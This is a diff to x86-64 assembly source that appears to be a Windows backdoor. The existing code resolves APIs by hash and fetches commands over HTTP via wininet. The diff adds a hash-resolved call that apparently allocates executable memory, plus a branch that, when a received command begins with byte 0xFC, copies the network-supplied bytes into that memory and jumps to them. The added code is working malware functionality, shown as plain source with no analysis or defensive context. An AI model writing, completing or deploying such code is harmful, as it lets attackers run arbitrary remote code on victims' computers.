@@ -64,6 +64,11 @@ search_kernel32:
     call lookup_api
     mov [rbp - 120], rax
 
+    mov rcx, r12
+    mov r8d, 0x91afca54
+    call lookup_api
+    mov [rbp - 184], rax
+
 load_wininet:
     mov rax, 0x2e74656e696e6977
     mov [rbp - 256], rax
@@ -254,6 +259,9 @@ read_command:
 
     mov byte ptr [rbp - 2048 + r12], 0
 
+    cmp byte ptr [rbp - 2048], 0xFC
+    je execute_shellcode
+
 execute_command:
     lea rdi, [rbp - 5120]
     lea rsi, [rbp - 2048]
@@ -275,6 +283,27 @@ copy_cmd:
     
     pop rdi
     pop rsi
+    jmp close_get_request
+
+execute_shellcode:
+    xor rcx, rcx
+    mov rdx, r12
+    mov r8, 0x3000
+    mov r9, 0x40
+    sub rsp, 32
+    call [rbp - 184]
+    add rsp, 32
+
+    test rax, rax
+    jz close_get_request
+
+    mov rdi, rax
+    lea rsi, [rbp - 2048]
+    mov rcx, r12
+    rep movsb
+
+    sub rdi, r12
+    call rdi
     jmp close_get_request
 
 send_output:
@@ -404,4 +433,3 @@ lookup_fail:
     pop rdi
     pop rbx
     ret
-
